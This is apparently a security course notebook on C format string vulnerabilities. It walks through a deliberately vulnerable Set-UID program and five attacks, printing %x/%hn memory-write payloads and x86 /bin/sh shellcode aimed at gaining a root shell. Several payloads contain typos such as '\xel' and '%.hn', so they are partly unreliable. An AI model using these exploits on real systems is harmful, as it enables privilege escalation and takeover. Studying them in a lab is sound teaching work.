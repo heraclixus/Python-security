{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Format String Vulnerability\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Function with Variable Number of Arguments\n",
    "an example is the C _printf()_ function, which can accepts any number of arguments.\n",
    "```c\n",
    "#include <stdio.h>\n",
    "int main() {\n",
    "    int i = 1, j = 2, k = 3; \n",
    "    printf(\"print 3 numbers: %d, %d, %d\\n\", i,j,k);\n",
    "}\n",
    "```\n",
    "This is because printf is defined as:\n",
    "```c\n",
    "int printf(const char *format, ...); \n",
    "```\n",
    "the (...) in the argument indicates zero or more optional arguments can be provided when function is invoked. The optional arguments in C are accessible via the __stdarg__ macros defined in _stdarg.h_ header file. \n",
    "```c\n",
    "#include <stdio.h>\n",
    "#include <stdarg.h>\n",
    "\n",
    "int print2(int Narg, ...) {\n",
    "    int i;\n",
    "    va_list ap;\n",
    "    va_start(ap, Narg);\n",
    "    for (i = 0; i < Narg; i++) {\n",
    "        printf(\"%d \", va_arg(ap, int));\n",
    "        printf(\"%f\\n\", va_arg(ap, double));\n",
    "    }\n",
    "    va_end(ap);\n",
    "}\n",
    "int main() {\n",
    "    print2(1, 2, 3.5);\n",
    "    print2(2, 2, 3.5, 3, 4.5);\n",
    "    return 1; \n",
    "}\n",
    "```\n",
    "When print2 is called, the function arguments are passed on the stack (from higher address to lower) in the sequence of 4.5, 3, 3.5, 2, 2; the ```va_list``` list is used to access the arguments. It has length defined by Narg, and access in the __'reverse' order__, from 2 to 4.5. ```va_start()``` macro gets address of Narg, calculates its size based on type, and then sets value of ```va_list``` to address + size. So in this example ``va_list`` starts 4 bytes above Narg. <br>\n",
    "`va_list` movement is determined by the `va_arg(ap, <type>)` macro. the `<type>` is used to determine how many bytes to move: if it is int type, move 4 bytes above, if double, move 8 bytes, etc. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `printf` function gets the list of argument in similar manner, the difference is that it uses explicit `type` option defined by the user. For example, `printf(\"print 3 numbers: %d, %d, %f\\n\", i,j,k)` already specified that there are two int type arguments and one float type following. If the input format string has type `%s`, which refers to string, the argument will be a pointer to the string object. <br>\n",
    "The Program only cares about the advancement of the `va_list` specified in the format string, and when an input is missing, it still advances and prints the data in the memory location specified by the offset (even when it is not in the current stack frame). "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```c\n",
    "#include <stdio.h>\n",
    "int main()\n",
    "{\n",
    "    int id =100, age=25; char *name = \"Bob\";\n",
    "    printf(\"ID: %d, Name: %s, Age:%d\\n\", id, name);\n",
    "}\n",
    "```\n",
    "This program's printf misses one argument for the `Age`, which should be an int. The printf function will then access 4 bytes above the `va_list`, even though it is undefined in the current stack frame.\n",
    "* The Compiler will generate a warning for this case, but it will still compile. \n",
    "This fact leaves room for exploit: user can inject any input into the program's memory space, thus potentially trigger arbitrary code execution, and privilege escalation. The following three cases are examples where users can input arbitrary strings into the program.\n",
    "* `printf(user_input);`\n",
    "* `sprintf(format, \"%s %s\", user_input, \": %d\");\n",
    "  printf(format, program_data);`\n",
    "* `sprintf(format, \"%s %s\", getenv(\"PWD\"), \": %d\" );\n",
    "  printf(format, program_data);`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Experiment Setup \n",
    "```c\n",
    "#include <stdio.h>\n",
    "\n",
    "void fmtstr() {\n",
    "    char input[100];\n",
    "    int var = 0x11223344;\n",
    "    \n",
    "    printf(\"Target address: %x\\n\", (unsigned) &var);\n",
    "    printf(\"Data at target address: 0x%x\\n\", var); \n",
    "    printf(\"enter a string: \"); \n",
    "    fgets(input, sizeof(input)-1, stdin);\n",
    "    printf(input); //vulnerable \n",
    "    printf(\"Data at target address: 0x%x\\n\", var);\n",
    "}\n",
    "\n",
    "void main() { fmtstr(); }\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Stack layout for the program is as follows:\n",
    "![fstack1](./image_files/fstack1.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We will compile and set it as Set-UID program: \n",
    "```\n",
    "gcc -o vul vul.c\n",
    "sudo chown root vul\n",
    "sudo chmod 4755 vul \n",
    "sudo sysctl -w kernel.randomize_va_space=0 \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Attacks \n",
    "\n",
    "#### Attack 1: Crash the Program \n",
    "Will numerous number of parameters for format string, `va_list` can step into fmtstr()'s stack frame and access invalid address. Sample input is simply: `%s%s%s%s%s%s%s%s%s`, which could trigger a segfault. \n",
    "\n",
    "#### Attack 2: Print out Data on Stack \n",
    "One can print anything with the formatted input `%x`, which tells the program to print any integer values at the target memory address.\n",
    "\n",
    "#### Attack 3: Change Program Data in Memory\n",
    "![fstack2](./image_files/fstack2.png)\n",
    "* __The %n option__: \n",
    "    when `printf(\"hello%n, %i)` is used, it will store integer 5 to the provided memory address, which is the address of variable i. In general, when printf() sees %n, it gets a value pointed to by the `va_list` pointer, and write to the memory provided. \n",
    "* __Insert Input into a File__: \n",
    "    The address, for example, could be obtained via gdb, say it is 0xBFFFF304. We need to input this address as the input for the format string. Suppose we know that the offset from the target value to the address of input string takes five %x formatted inputs. \n",
    "```\n",
    "echo $(printf \"\\x04\\x0F3\\xFF\\xBF\").%x.%x.%x.%x.%x.%x.%n >input\n",
    "```\n",
    "The address is in little endian format, and treated as a command. The first part of the input ends up being the address we want. Since we need the condition that __When %n is used, the `va_list` directly points at the target memory address__, we used five %x.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "vuln < input \n",
    "```\n",
    "will trigger the attack, and the target memory (Variable) will be rewritten with the quantity equivalent to the number of bytes printed before the printf() sees %n. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Attack 4: Change Program Data to Specific Value \n",
    "One can use the _precision modifier_ and _width modifier_ to modify the number of already printed value and modify %n. However this is not very efficient. <br>\n",
    "* %n : treat the argument as a 4 byte integer.\n",
    "* %hn: treat the argument as a 2 byte short, overwrites 2 least significant bytes of the argument.\n",
    "* %hnn: treat the argument as a 1 byte char, overwrites the least significant byte.\n",
    "Our goal is to rewrite the variable stored at memory location 0xBFFFF304, which is initially 0x11223344, to 0x66887799. We can modify the memory 2 bytes at a time: breaking the original data into two parts: \n",
    "* the first part is a 2 byte short with address 0xBFFFF304\n",
    "* the second part is a 2 byte short with address 0xBFFFF306 \n",
    "\n",
    "```c \n",
    "\"\\x06\\xf3\\xff\\xbf@@@@\\x04\\xf3\\xff\\xbf_%x_%x_%x_%x_%x\\%hn_%x%hn\"\n",
    "```\n",
    "is placed at beginning of the format string, and the two addresses are stored. There is an exatra %x between the two %hn, since we have additional 4 bytes @@@@ in between. <br>\n",
    "* Then, we need to modify the value with number we specify: with precision modifiers. To use _%.8x for the first 4 %x, when we arrive at the first %hn, 12 + 5 + 40 = 49 characters have been printed. To each 0x6688, or 26248, we need 26199 more characters, therefore the last %x has precision set to 26199. <br>\n",
    "* Then, we need to modify the second address, which should be modified to value 0x7799. This is why we put @@@@ in between, so we can insert a 4 byte precision value. The difference between 0x7799 and 0x6688 is 4369, so we take 4368 as the precision, since we have one '_' before. This makes total printed character number as 0x6688 + 4369 = 0x7799. So when we reach the second %hn, value 0x7799 will be wrote to the memory address. The resulting string should be: \n",
    "```\n",
    "echo $(printf \"\\x06\\xf3\\xff\\xbf@@@@\\x04\\xf3\\xff\\xbf\")\n",
    "     _%.8x_%.8x_%.8x_%.8x_%.26199x%hn_%.4368x%hn > input \n",
    "```\n",
    "The following image specifies the process. \n",
    "![fstring](./image_files/fstring.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Attack 5: Code Injection (Finally, shellcode)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Four challenges:\n",
    "* Code Injection to stack\n",
    "* Find the starting address of the injected code\n",
    "* Find where the return address is stored (Say it is B)\n",
    "* Write the value A to the memory B\n",
    "The first three challenges can be achieved using gdb debugger and experimentation. We can append shellcode at the end of the format string. Suppose that we found the return address is 0xBFFFF38C, and the entry code for injected shellcode is 0xBFFFF358. So we need to write the value 0xBFFF358 to address 0xBFFFF38C. <br>\n",
    "With the same technique, we break the data into two %hn chunks, one starting at 0xBFFFF38C and one at 0xBFFFF38E. We write 0xBFFF to first address and 0xF358 to the second address. <br>\n",
    "The following input is thus written as: \n",
    "```\n",
    "echo $(printf \"\\x8e\\x3f\\xff\\xbf@@@@\\x8c\\x3f\\xff\\xbf\")\n",
    "     _%.8x_%.8x_%.8x_%.8x_%.49102x%hn_%.13144x%.hn\n",
    "     $(printf \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n",
    "       \\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xel\\x99\\xb0\\x0b\\xcd\\x80\") > input \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we run the input as above, we do not get a stable shell, because the stdin is set from the input file. The workaround is to write a separate shell script to redirect the stdin as the terminal: \n",
    "```\n",
    "echo $(printf \"\\x8e\\x3f\\xff\\xbf@@@@\\x8c\\x3f\\xff\\xbf\")\n",
    "     _%.8x_%.8x_%.8x_%.8x_%.49102x%hn_%.13144x%.hn\n",
    "     $(printf \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n",
    "       \\x31\\xc0\\x50\\x68/tmp\\x68/bad\\x89\\xe3\\x50\\x53\\x89\\xel\\x99\\xb0\\x0b\\xcd\\x80\") > input \n",
    "```\n",
    "here, a shell script is written as '\\tmp\\bad', in which we have:\n",
    "```\n",
    "#!/bin/sh\n",
    "/bin/sh 0 < &1 \n",
    "```\n",
    "which invokes a shell and uses the terminal as the standard input (terminal is represented as the standard output device &1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
